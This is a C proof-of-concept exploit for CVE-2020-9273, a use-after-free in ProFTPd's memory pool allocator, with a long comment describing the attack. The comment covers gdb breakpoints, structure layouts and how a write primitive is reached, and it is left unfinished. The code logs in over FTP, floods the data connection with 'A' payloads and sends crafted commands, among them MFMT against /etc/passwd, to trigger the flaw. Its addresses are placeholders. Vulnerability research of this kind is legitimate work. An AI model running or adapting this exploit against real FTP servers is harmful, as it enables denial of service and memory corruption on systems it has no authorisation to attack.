/*
 * ProFTPd lame crash-controllabe poc and writeup for CVE-2020-9273
 *
 * To trigger the vulnerability and stops right before the crash, configure 
 * your gdb and breakpoints to the following:
 *
 * set args --nodaemon -d10
 * set follow-fork-mode child
 * handle SIGPIPE nostop
 * break pool.c:422 if (p && p->tag >= 0x4141414141414141)
 * break pool.c:462 if (p && p->tag >= 0x4141414141414141)
 * break pool.c:569 if (p->tag >= 0x4141414141414141)
 *
 * These steps will set up breakpoints inside the following functions:
 * alloc_pool() - where use-after-free is triggered in first place;
 * make_sub_pool() - where we have another WRITE primitive chance;
 * pr_pool_create_sz() - will not be used in the context of this poc.
 * These are the code points where it allow us to obtain WRITE primitive.
 * 
 * Now, execute this poc. 
 *
 * When gdb stops, you must change some values of the structure pool_rec p,
 * otherwise a crash will happen trying to read p->last->h.first_avail at line
 * pool.c:575. So, inside gdb do:
 *
 * p p->last=&p->cleanups
 * p p->sub_next=(p+10)
 *
 * That's required because in this vulnerability we have no READ primitive.
 * We cannot read memory and leak a valid and known address before writing.
 * Thus, the consequence is that the only way to exploit this vulnerability
 * is brute-forcing memory addresses, which, obviously, is not cool at all.
 *
 * Let's take a look at struct pool_rec to better understand:
 *
 * struct pool_rec {
 *    union block_hdr *first;
 *    union block_hdr *last;
 *    struct cleanup *cleanups;
 *    struct pool_rec *sub_pools;
 *    struct pool_rec *sub_next;
 *    struct pool_rec *sub_prev;
 *    struct pool_rec *parent;
 *    char *free_first_avail;
 *    const char *tag;
 * }
 *
 * We've chosen &p->cleanups location just to be easy to visualize and also
 * manipulate p content. The single condition is that it must be a writable
 * memory, because the process will perform some writes to this location.
 *
 * &p->cleanups would be an address of a pointer to another structure.
 * We've filled structure p with our payload, so we're not really interested
 * on the p->cleanups pointer, but the offset to it.
 * In other words it's the same as: p->last=(unsigned long *)&p->first + 2)
 * 
 * Let's explore union block_hdr type, since it's where we had writen to:
 *
 * // I've simplified #defines to x86_64 architecture
 * union block_hdr {
 *    union align a;
 *    char pad[32];
 *    struct {
 *       void *endp;
 *       union block_hdr *next;
 *       void *first_avail;
 *    } h;
 * }
 *
 * The choice for p->sub_next value was not so arbitrary. In fact, the value of
 * p->last->h.first_avail should be greater than p->last->h.endp. This is
 * required in order to reach the execution flow that we want. Since p+10 is
 * controlled by us (a value inside our payload), we can put a high value like
 * 0x4141414141414141 so the comparison on pool.c:589 would evaluate to true,
 * and a controllable address will be returned.
 *
 * Remember that p has (struct pool_rec *) size, so in gdb p+10 in fact means
 * a shift of sizeof(struct pool_rec)*10. The value of p->sub_next will not be
 * of much use for us, except that it'll hold the location where error codes 
 * and error messages will be writen, so, again, it must be writable.
 *
 * The addresses pointed by p->last->h.first_avail will be used as a writable
 * location 4 times, increasing the base address as follows:
 * first by 0x8;
 * later by 0x30;
 * later by 0x8;
 * later by 0x30.
 *
 * Remember that the address returned by alloc_pool() will be used to write
 * error messages. So first it's an error code, than an error string. The same
 * happens twice, that's because the source memory address is increased. Since
 * the ProFTPd has its own memory allocator, this is how the allocator aligns
 * memory.
 *
 * In order to successfuly achieve WRITE primitive before the execution flows
 * cleans out our payload, we can use pr_table_kget() function to iteract in
 * the loop at line table.c:599. But life being life, of course this is not
 * so simple.
 *
 * The tab variable in pr_table_kget() points to session.curr_cmd_rec, which 
 * is a temporary pointer variable used to process the current FTP command 
 * received in the (now closed) FTP control connection - usually at TCP 21.
 *
 * That exploitatoin happens on table.c .... (TO BE CONTINUED)
 * First of all the idx variable (which controls tab index) cause....
 * .... (TO BE CONTINUED)
 *
 * by cardinal3
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <err.h>
#include <errno.h>

#define RCVD_BUFF_SIZE 512    /* size of buffer to store answer of FTP control connection */
#define SEND_BUFF_SIZE 81984   /* size of buffer to send payload on FTP data connection */
//#define SEND_BUFF_SIZE 81920   /* size of buffer to send payload on FTP data connection */

#define DELTA 48941                                     /* delta = &session.curr_cmd_rec->notes->chains - &resp_pool */

#define RESP_POOL "EEEEEEEE"    /* resp_pool */
//#define RESP_POOL "\x21\xbe\x8a\x55\x55\x55\x00\x00"    /* resp_pool */
//#define RESP_POOL "\x81\xc2\x8a\x55\x55\x55\x00\x00"    /* resp_pool */
//#define RESP_POOL "\x41\x1a\x8b\x55\x55\x55\x00\x00"    /* resp_pool */

#define NOTES_CHAIN "DDDDDDDD"  /* session.curr_cmd_rec->notes->chains */
//#define NOTES_CHAIN "\x68\xc5\x8c\x55\x55\x55\x00\x00"  /* session.curr_cmd_rec->notes->chains */
//#define NOTES_CHAIN "\x98\xc7\x8c\x55\x55\x55\x00\x00"  /* session.curr_cmd_rec->notes->chains */
//#define NOTES_CHAIN "\xe8\x1e\x8d\x55\x55\x55\x00\x00"  /* session.curr_cmd_rec->notes->chains */

#define exit_on_error(P) if(P) err(errno, NULL);

void ftp_data_connection();

int main(void)
{
    int s=0,sc=0;
    int rc, wstatus;
    int opt=1;
    pid_t pid=-1;
    char buf[RCVD_BUFF_SIZE] = {0};
    char tmpstr[SEND_BUFF_SIZE]={0x41};
    struct sockaddr_in sa;

    printf("--- ProFTPd lame exploit - by cardinal3 ---\n");

    pid = fork();
    switch(pid)
    {
        case -1:
            err(errno, "error in fork");
            break;

        case 0: /* child, FTP data connection */
            //setsid(); // makes sense?
            /* address structure for FTP data listenning connection */
            sa.sin_family = AF_INET;
            sa.sin_port = htons(3762);
            sa.sin_addr.s_addr = htonl(INADDR_ANY);

            /* bind and listen socket and accept remote FTP data connection*/
            s = socket(AF_INET, SOCK_STREAM, 0);
            exit_on_error(s < 0);
            rc = setsockopt(s, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
            exit_on_error(rc < 0);
            rc = bind(s, (struct sockaddr *)&sa, sizeof(sa));
            exit_on_error(rc < 0);
            rc = listen(s, 1);
            exit_on_error(rc < 0);
            sc = accept(s, 0, 0);
            exit_on_error(sc < 0);

            /* send data to remote FTP server */
            dprintf(2, "[+] received FTP data connection, sending payload\n");
            for(int i=0; i<SEND_BUFF_SIZE; i++)
                tmpstr[i] = 'A';

            do {
                dprintf(2, "+");
                //rc = send(sc,"DDDDDDDDCCCCCCCCBBBBBBBBAAAAAAAADDDDDDDDCCCCCCCCBBBBBBBBAAAAAAAADDDDDDDDCCCCCCCCBBBBBBBBAAAAAAAADDDDDDDDCCCCCCCCBBBBBBBBAAAAAAAA",128,0);
                rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                // parei aqui mas vou me atrever
                rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                //rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                //rc = send(sc, tmpstr, SEND_BUFF_SIZE, 0);
                rc = send(sc, "\r\n", 2, 0);
                sleep(1);
            } while (sc && rc > 0);

            dprintf(2, "[+] bye from child fork\n");
            if (sc) close(sc);
            if (s) shutdown(s, SHUT_RDWR);
            exit(0);
            break;

        default: /* parent */
            /* address structure for command connection */
            sa.sin_family = AF_INET;
            sa.sin_port = htons(2121);
            sa.sin_addr.s_addr = inet_addr("127.0.0.1");

            /* FTP commands socket */
            s = socket(AF_INET, SOCK_STREAM, 0);
            exit_on_error(s < 0);

            /* connect to remote FTP and reads banner */
            rc = connect(s, (const struct sockaddr *)&sa, sizeof(sa));
            exit_on_error(rc < 0);
            rc = recv(s, buf, RCVD_BUFF_SIZE-1, 0);
            exit_on_error(rc < 0);
            buf[RCVD_BUFF_SIZE]='\0';

            /* send USER and PASS login commands */
            rc = send(s, "USER poc\r\n", 10, 0);
            rc = recv(s, buf, RCVD_BUFF_SIZE-1, 0);
            rc = send(s, "PASS poc\r\n", 10, 0);
            rc = recv(s, buf, RCVD_BUFF_SIZE-1, 0);
            buf[RCVD_BUFF_SIZE]='\0';
            if (rc > 0 && strcmp("230 ", buf) && strcmp("logged in", buf)) {
                printf("[+] user logged in\n");
            } else {
                err(errno, "wrong user and password");
            }

            /* send PORT and STOR commands to start transference */
            //sleep(1);
            rc = send(s, "PORT 127,0,0,1,14,178\r\n", 23, 0);
            rc = recv(s, buf, RCVD_BUFF_SIZE-1, 0);

            /* start listenning socket to wait for FTP remote data connection */
            printf("[+] child process PID: %d\n", pid);
            sleep(1);
            //rc = send(s, "TYPE I\r\n", 8, 0);
            //rc = recv(s, buf, RCVD_BUFF_SIZE-1, 0);
            rc = send(s, "STOR /tmp/bbb\r\n", 15, 0);
            rc = recv(s, buf, RCVD_BUFF_SIZE-1, 0);
            exit_on_error(rc <= 0);
            if (!strcmp("200 ", buf)) err(errno, "error STOR");

            /* send data payload syncronized with control connection  */
            printf("[+] triggering the use-after-free\n");
            rc = send(s, "MODE S\r\n", 8, 0);
            rc = send(s, "SITE CHMOD 777 /tmp/bbb\r\n", 25, 0);
            //rc = send(s, "REIN\r\n", 6, 0);
            //rc = send(s, "MLSD\r\n", 6, 0);
            //rc = send(s, "MDTM /etc/passwd\r\n", 18, 0);
            rc = send(s, "MFMT 20200711001919 /etc/passwd\r\n", 33, 0);
            rc = send(s, "MKD /tmp/aaa\r\n", 14, 0);
            rc = send(s, "USER xxx\r\n", 10, 0);
            //rc = send(s, "MKD /tmp/x\r\n", 12, 0);
            //rc = send(s, "HELP\r\n", 6, 0);
            //rc = send(s, "ACCT 0\r\n", 8, 0);
            //rc = send(s, "STOR dddd\r\n", 11, 0);

            if (s) {
                //printf("[+] closing FTP control connection\n");
                shutdown(s, SHUT_RDWR);
            } else {
                printf("[-] humm strange, socket is already closed\n");
            }
            do
            {
                rc = waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
                if (rc == -1) {
                    exit_on_error(rc <= 0);
                }
                if (WIFEXITED(wstatus)) {
                    printf("[+] parent caught: child exited with status=%d\n", WEXITSTATUS(wstatus));
                } else if (WIFSIGNALED(wstatus)) {
                    printf("[+] parent caught: child got signal %d (propably remote connection was closed)\n", WTERMSIG(wstatus));
                } else if (WIFSTOPPED(wstatus)) {
                    printf("[+] parent caught: child stopped by signal %d\n", WSTOPSIG(wstatus));
                }
            } while (!WIFEXITED(wstatus) && !WIFSIGNALED(wstatus));

            break;
    }

    return 0;
}
